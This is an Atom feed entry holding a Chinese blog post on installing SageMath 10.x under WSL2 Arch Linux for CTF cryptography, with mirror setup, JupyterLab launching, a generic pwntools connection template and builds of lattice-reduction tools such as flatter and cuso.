  <entry>
    <title>SageMath10.x最新版安装指引</title>
    <link href="https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/"/>
    <id>https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/</id>
    <published>2024-11-06T17:47:23.000Z</published>
    <updated>2025-09-07T09:09:29.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言-2024-11-7"><a href="#前言-2024-11-7" class="headerlink" title="前言(2024.11.7)"></a>前言(2024.11.7)</h1><p>由于懒人安装在<code>windows11</code>上面，最高只能获取到<code>Sagemath9.3</code>的版本，在<code>wsl2+ubuntu22.04</code>上面最新的也才<code>sagemath9.5</code>好像，不会升级，有些<code>exp</code>跑不了，遂安装了<code>Sagemath10.x</code>版本</p><p>在网上找了一圈，发现都没有教程是使用<code>WSL2+ubuntu22.04+sagemath10.x</code>的，很多都是在<code>Arch Linux</code>里面装的</p><p>特此，安装好了，可以运行了，写下了这篇博客</p><p>闲来无事，去敲打了一下<code>Kimi</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SageMath 10.x 版本推荐使用 Arch Linux 的原因主要有以下几点：</span><br><span class="line">维护良好且最新的SageMath包：从Sage 10.2开始，Arch Linux 提供了维护良好且最新的SageMath包，这意味着用户可以更容易地获得最新版本的SageMath，以及及时的安全更新和功能改进。</span><br><span class="line">兼容性和支持：Arch Linux 对于 SageMath 的支持较好，社区活跃，能够及时解决与SageMath 相关的兼容性问题</span><br><span class="line">滚动更新模型：Arch Linux 采用滚动更新模型，这意味着系统和软件包始终保持最新状态，这对于科研和开发人员来说是一个很大的优势，因为他们可以快速获得最新的软件和库</span><br><span class="line"></span><br><span class="line">用户推荐：有用户因为个人使用体验良好而推荐在 Arch Linux 下安装 SageMath。他们可能觉得在 Arch Linux 下使用 SageMath 更为方便，尤其是在 WSL2 环境下。</span><br><span class="line">从源代码安装的便利性：Arch Linux 的文档中提到，Sage源代码树包含符号链接，如果使用Windows行结束而不是UNIX行结束，构建将无法工作。这表明在Arch Linux（一个UNIX-like系统）上从源代码安装SageMath更为便利</span><br><span class="line"></span><br><span class="line">包管理器支持：SageMath 可以从各种发行版获得，并且可以由包管理器安装。Arch Linux 的包管理器 pacman 使得安装和更新 SageMath 变得简单</span><br><span class="line"></span><br><span class="line">综上所述，Arch Linux 提供了最新的SageMath包、良好的社区支持、滚动更新模型以及从源代码安装的便利性，这些因素共同使得它成为运行 SageMath 10.x 版本的推荐选择</span><br></pre></td></tr></table></figure><p>我的评价是，<code>Arch Linux</code>能用<strong>最新版！</strong><br>本来是想参考<a href="https://tover.xyz/p/SageMath-10-1-Installation/">师兄</a>的，发现还是做不到啊，死在了<code>conda</code>上，原因未知</p><h1 id="安装wsl2-Arch-Linux"><a href="#安装wsl2-Arch-Linux" class="headerlink" title="安装wsl2+Arch Linux"></a>安装wsl2+Arch Linux</h1><p><code>wsl2</code>的安装的话，参考网上的教程，一大堆</p><p>然后，在微软商城下载<code>Arch WSL</code>，打开之后就是用户名密码的配置<br>非默认系统的情况下，<code>wsl -d Arch</code>进入<code>Arch Linux</code></p><p><code>wsl --list</code>可以看到当前有什么<code>适用于 Linux 的 Windows 子系统分发</code><br>设为默认子系统，可以将<code>Arch</code>换成别的，比如<code>Ubuntu-22.04</code><br><code>wsl --set-default Arch</code></p><h1 id="配置pacman"><a href="#配置pacman" class="headerlink" title="配置pacman"></a>配置pacman</h1><p>(很强大的包管理器)<br>配置pacman镜像源，也就是换源(因为自身的源太慢了，或者因为是国外的，用不了，得换成国内的镜像源，比如阿里源、清华源等)<br><code>sudo su</code>进入<code>root</code>模式<br><code>vim /etc/pacman.d/mirrorlist</code><br>在顶部增加</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = http://repo.archlinuxcn.org/<span class="variable">$arch</span></span><br><span class="line">Server = http://mirrors.163.com/archlinux-cn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.aliyun.com/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>更新系统，输入<code>pacman -Syu</code>，不知道梯子有没有影响(有时候开梯子很慢)，看情况是否把梯子关闭吧</p><p>配置<code>pacman key</code>，输入以下命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line">pacman-key --populate</span><br><span class="line">pacman -Sy archlinux-keyring</span><br></pre></td></tr></table></figure><p>更新系统<code>pacman -Syu</code>，为什么这里又更新呢，因为这一步是必须的，上一步如果配置<code>pacman key</code>出现网络问题，更新系统就能解决，如果没有就不用更新系统了</p><p>如果源用不了(换了源之后的情况)，比如<code>Could not resolve host</code>，可能是<code>DNS</code>出了点问题(?)，经验告诉我是这样的，<code>vim /etc/resolv.conf</code>，增加<code>nameserver 8.8.8.8</code>，这个是谷歌的<code>DNS</code>服务器，也可以再加多一个<code>nameserver 114.114.114.114</code>，可以把原来的那个本地的删了，应该没有什么问题()</p><p>出现了个问题，在<code>Arch Linux</code>里面配置禁止重启自动更新的话是有问题的(同样的操作在ubuntu是没有任何问题的)，表现为<code>/etc/resolv.conf</code>文件不存在。。。所以在<code>Arch Linux</code>里面就不要配置这个了，有问题再加谷歌的<code>DNS</code>服务器</p><p>配置<code>archlinuxcn</code>镜像源，<code>vim /etc/pacman.conf</code>，增加以下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>安装<code>archlinuxcn</code>的<code>key</code>，<code>pacman -Sy archlinuxcn-keyring</code></p><p>这两个<code>key</code>吧，我也不知道有没有配置成功，输入命令之后好像没反应，总感觉没有成功一样的(?)</p><p>继续安装后面的<code>sage</code>，完成之后既然没有出现问题，那就不管它了</p><h1 id="安装sage"><a href="#安装sage" class="headerlink" title="安装sage"></a>安装sage</h1><p><code>sudo pacman -Sy sagemath</code><br><strong>请耐心耐心再耐心等待，好几个G呢！！！</strong><br>运行<code>sage</code>，看看是否安装成功<br><img src="https://picx.zhimg.com/80/v2-700679ee72ed9b6dd33bbfcc1c956af7_1440w.png" alt=""><br>可以看到都是最新版，这下好玩了<br>如果需要管理<code>sage</code>，它的文件路径是<code>Arch\usr\lib\python3.12\site-packages\sage</code></p><h1 id="安装JupyterLab-推荐"><a href="#安装JupyterLab-推荐" class="headerlink" title="安装JupyterLab(推荐)"></a>安装JupyterLab(推荐)</h1><p><code>sudo pacman -S jupyterlab</code></p><h1 id="在JupyterLab中启动Sage"><a href="#在JupyterLab中启动Sage" class="headerlink" title="在JupyterLab中启动Sage"></a>在JupyterLab中启动Sage</h1><p><code>sage -n jupyterlab --allow-root</code><br>按道理来说不指定浏览器，你点击它之后会自动跳到默认浏览器的，但是我这里跳到了<code>Edge</code>浏览器，不是我默认的火狐浏览器</p><p>也懒得改了，直接浏览器输入<code>http://localhost:8888/lab</code><br>通常我们是不记指令的，那么我们来搞一个<code>bash</code>脚本快速启动，其实就是把这条指令丢进去<br>在工作目录下，比如我的<code>/mnt/d/desktop</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">vim sage.sh</span><br><span class="line"><span class="comment"># 输入以下两行的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">sage -n jupyterlab --allow-root</span><br></pre></td></tr></table></figure><p>保存退出之后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x sage.sh</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">./sage.sh</span><br></pre></td></tr></table></figure><p>所以，平时我们需要使用<code>sagemath</code>的时候，在我们的工作目录下面<code>./sage.sh</code>即可启动</p><h1 id="导入一些库"><a href="#导入一些库" class="headerlink" title="导入一些库"></a>导入一些库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo pacman -S python-&lt;package_name&gt; [python-&lt;package_name&gt;]</span></span><br><span class="line"><span class="comment"># 温馨提示：有的库没法安装是因为Arch里边没有而已，整个pip并用pip3安装即可</span></span><br><span class="line">sudo pacman -S python-gmpy2 python-pycryptodome python-pwntools python-tqdm</span><br></pre></td></tr></table></figure><p>后续还有<code>python</code>其他的库需要安装，可以参考上面的格式<code>python-xxxx</code>，也可以去整个<code>pip</code>，目前来说这些是够了的(只打ctf crypto方向，应该够)，好像它内置就挺多了的</p><p>最舒服的就是，你在<code>windows</code>下面下载的<code>pwntools</code>，可能过了一阵子，等你又安装了别的什么什么东西，可能是一些依赖项冲突了，会导致你<code>from pwn import *</code>无法使用</p><p>所以我的解决方案是在<code>Linux</code>里面下载<code>pwntools</code>(环境隔绝)，在<code>Linux</code>里面执行<code>python</code>脚本就好了，就像这里<code>Arch Linux</code>的<code>pwntools</code>就不会起冲突，可以正常使用</p><p>有的萌新可能第一次接触<code>crypto</code>方向的容器题，可能有点难上手，现提供一个板板</p><p>密码学方向环境题(通俗一点来说，就是打远程)的交互脚本模板如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 连接服务</span></span><br><span class="line">p = remote(<span class="string">&#x27;host&#x27;</span>, port)</span><br><span class="line"><span class="comment"># 记录调试信息</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># 接收服务器端的信息，识情况而选</span></span><br><span class="line">a = p.recvline()</span><br><span class="line">p.recvlines(n)</span><br><span class="line">p.recvall()</span><br><span class="line">p.recv(n)   <span class="comment"># 接收n字节</span></span><br><span class="line">p.recvuntil(delim)  <span class="comment"># 一直接收，直到delim为止</span></span><br><span class="line"><span class="comment"># 发送信息给服务器端，识情况而选</span></span><br><span class="line">p.send(string)</span><br><span class="line">p.sendafter(string,payload) <span class="comment"># 接收到string后发送</span></span><br><span class="line">p.sendline(string)    <span class="comment">#   末尾有 \n</span></span><br><span class="line">p.sendlineafter(string,payload)</span><br><span class="line"><span class="comment"># 保持交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是接收和发送的数据类型都是字节数据，比如<code>b&#39;hello&#39;</code></p><h1 id="安装flatter-可以加速格基规约"><a href="#安装flatter-可以加速格基规约" class="headerlink" title="安装flatter(可以加速格基规约)"></a>安装flatter(可以加速格基规约)</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gmp mpfr eigen base-devel gcc git cmake</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/keeganryan/flatter.git</span><br><span class="line"><span class="built_in">cd</span> flatter</span><br><span class="line"><span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> ./build</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig <span class="comment">#这个可以不输入</span></span><br></pre></td></tr></table></figure><p><code>flatter -h</code>查看是否能正常使用</p><h1 id="代码补全功能"><a href="#代码补全功能" class="headerlink" title="代码补全功能"></a>代码补全功能</h1><p>路径：<code>Setting-&gt;Setting Editer-&gt;Code Completion</code><br><img src="https://picx.zhimg.com/80/v2-94dfe83b491d36a5837bfb8a7be17f6c_1440w.webp" alt=""><br>感觉函数解释是不需要的，有点碍眼睛<br><img src="https://picx.zhimg.com/80/v2-2bd85de9329534e40610f5c15c15c6a7_1440w.png" alt=""><br>测试运行</p><h1 id="2025-9-7续"><a href="#2025-9-7续" class="headerlink" title="2025.9.7续"></a>2025.9.7续</h1><h2 id="cuso-copper-solver"><a href="#cuso-copper-solver" class="headerlink" title="cuso(copper solver)"></a>cuso(copper solver)</h2><p><a href="https://github.com/keeganryan/cuso">github链接</a></p><p>确保前面的<code>flatter</code>可用，要是<code>flatter -h</code>不正常，重新再弄一次即可(我就重新弄了一次)<br>还需要<code>msolve</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/algebraic-solving/msolve</span><br><span class="line">sage -sh</span><br><span class="line"><span class="built_in">cd</span> msolve</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><code>msolve- v</code>检查一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/keeganryan/cuso.git</span><br><span class="line">sage -sh</span><br><span class="line"><span class="built_in">cd</span> cuso/</span><br><span class="line">sudo pacman -S python-pip</span><br><span class="line">pip install . --break-system-packages</span><br></pre></td></tr></table></figure><p><strong>sage脚本</strong>运行一下<code>from cuso import find_small_roots</code>试试，看看是否可以正常运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">relations: 关系式</span><br><span class="line">bounds: 界限</span><br><span class="line">modulus: 模数</span><br><span class="line">modulus_multiple: 模数的幂次</span><br><span class="line">modulus_lower_bound: 模数的最低</span><br></pre></td></tr></table></figure><p>再<strong>具体</strong>的用法可参考<br><a href="http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/">http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/</a></p><p>这篇<strong>wp</strong>也多次使用到了<strong>cuso</strong><br><a href="https://languag3.github.io/2025/08/25/nss4th">https://languag3.github.io/2025/08/25/nss4th</a></p><h2 id="再补充一个"><a href="#再补充一个" class="headerlink" title="再补充一个"></a>再补充一个</h2><p>比如<a href="https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver">MT19937</a>，这种可以直接导入的包(放在<strong>同一目录下</strong>)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver</span></span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://shinichicun.top/posts/arch%E4%B8%8B%E7%9A%84sage%E5%AE%89%E8%A3%85/">https://shinichicun.top/posts/arch%E4%B8%8B%E7%9A%84sage%E5%AE%89%E8%A3%85/</a><br><a href="https://zhuanlan.zhihu.com/p/633782050">https://zhuanlan.zhihu.com/p/633782050</a><br><a href="http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/">http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言-2024-11-7&quot;&gt;&lt;a href=&quot;#前言-2024-11-7&quot; class=&quot;headerlink&quot; title=&quot;前言(2024.11.7)&quot;&gt;&lt;/a&gt;前言(2024.11.7)&lt;/h1&gt;&lt;p&gt;由于懒人安装在&lt;code&gt;windows11&lt;/code</summary>
      
    
    
    
    
  </entry>
  
</feed>
